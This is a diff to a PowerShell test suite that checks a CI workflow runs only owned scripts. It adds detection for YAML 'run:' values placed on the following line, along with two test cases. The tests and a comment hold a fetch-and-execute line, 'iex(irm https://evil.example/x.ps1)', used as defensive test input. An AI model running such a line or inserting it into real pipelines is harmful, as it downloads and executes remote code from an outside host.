@@ -74,7 +74,7 @@ $script:Passes = 0
 # DECLARED, never counted from the cases that happened to run: a count taken
 # from what ran cannot notice that nothing did. Keep it in step with the cases
 # below -- a mismatch either way fails the run.
-$ExpectedCaseCount = 84
+$ExpectedCaseCount = 86
 
 # What the two cases that plant a package built to HANG give the sweep before
 # they expect it to give up, and how long this suite then waits for any case.
@@ -736,6 +736,19 @@ function Get-DeclaredSweepTimeoutMinute {
 # expands; anything else (a subexpression, a variable, a redirect, a brace)
 # fails the allowlist and the whole command reads as unowned, whatever
 # separator character it did or did not use.
+#
+# The captured group is `(.*?)`, not `(.+?)` (issue #135 fix round 4): YAML
+# lets a block-mapping value be a plain scalar on the FOLLOWING, more-indented
+# line -- `run:` / newline / `iex(irm https://evil.example/x.ps1)` on the next
+# line is the same value to any YAML consumer as if it sat after the colon.
+# The old `+?` group required at least one non-newline character after `run:`
+# on its OWN line, so that shape never matched at all and the command went
+# unread rather than merely unowned. This reader still never parses a
+# continuation line -- consistent with the multi-line `run: |` limitation
+# already noted above -- so a `run:` whose value is not present on its own
+# line is refused outright: the empty capture fails every branch of
+# $allowPattern by construction and reads as unowned, naming what little of
+# the line there was to name.
 function Get-UnownedCiCommand {
 	param([Parameter(Mandatory)] [AllowEmptyString()] [string] $Text)
 
@@ -747,8 +760,12 @@ function Get-UnownedCiCommand {
 	$allowPattern = '^\.\\scripts\\(?<name>[A-Za-z0-9_.-]+\.ps1)\b(?:[ \t]+(?:-[A-Za-z][A-Za-z0-9]*|''[^''\r\n]*''|"[^"$`\r\n]*"|[A-Za-z0-9_.:\\/-]+))*[ \t]*$'
 
 	$unowned = @()
-	foreach ($match in [regex]::Matches($Text, '(?m)^[ \t]*run:[ \t]*(.+?)[ \t]*\r?$')) {
+	foreach ($match in [regex]::Matches($Text, '(?m)^[ \t]*run:[ \t]*(.*?)[ \t]*\r?$')) {
 		$command = $match.Groups[1].Value
+		if ($command -eq '') {
+			$unowned += '<run: value is not on this line>'
+			continue
+		}
 		$whole = [regex]::Match($command, $allowPattern)
 		if ((-not $whole.Success) -or ($owned -notcontains $whole.Groups['name'].Value)) {
 			$unowned += $command
@@ -1299,6 +1316,44 @@ Test-Case 'a double-quoted subexpression argument to an owned scripts\ call is n
 		if ($unowned -notcontains $command) {
 			throw "'$command' was not read as unowned, so a double-quoted subexpression riding in an owned script's argument would pass the pin."
 		}
+	}
+}
+
+# Fix round 4, finding 1: YAML lets a block-mapping value be a plain scalar on
+# the FOLLOWING, more-indented line -- `run:` / newline / the command is the
+# same value to any YAML consumer as a same-line `run: <command>`. The old
+# `(.+?)` capture required at least one character after `run:` on its own
+# line, so that shape never matched the regex at all: the command went
+# unread, not merely unowned, and stayed invisible on both an LF checkout and
+# a CRLF one.
+Test-Case 'a run: value on the following line is refused, not silently unread' {
+	$command = 'iex(irm https://evil.example/x.ps1)'
+	$text = "      - name: Scratch`n        shell: pwsh`n        run:`n          $command`n"
+	$unowned = @(Get-UnownedCiCommand -Text $text)
+	if ($unowned.Count -eq 0) {
+		throw "a run: line whose value sits on the next line was not reported at all, so it would pass the pin unread."
+	}
+}
+
+# End-to-end reproduction of the finding's own proof method: an LF-converted
+# ci.yml with a scratch step whose run: value sits on the following line must
+# turn the real 'ci.yml runs no command outside scripts\' case red.
+Test-Case 'a ci.yml step with a next-line run: value on an LF checkout turns the pin red' {
+	$workflow = Join-Path $RepoRoot '.github\workflows\ci.yml'
+	if (-not (Test-Path -LiteralPath $workflow)) {
+		throw "no $workflow to read the run commands out of."
+	}
+	$text = (Get-Content -LiteralPath $workflow -Raw) -replace "`r`n", "`n"
+	$scratch = "      - name: Run something unowned (next line)`n        shell: pwsh`n        run:`n          iex(irm https://evil.example/x.ps1)`n"
+	$pattern = '(?m)^([ \t]*-[ \t]*name:[ \t]*Check out[ \t]*\n[\s\S]*?\n)(?=[ \t]*-[ \t]*name:)'
+	$mutated = [regex]::Replace($text, $pattern, "`$1$scratch", 1)
+	if ($mutated -eq $text) {
+		throw "inserting a scratch step changed nothing, so this case added no step at all."
+	}
+
+	$unowned = @(Get-UnownedCiCommand -Text $mutated)
+	if ($unowned.Count -eq 0) {
+		throw "a next-line run: value on an LF-converted ci.yml passed the pin unread."
 	}
 }
 
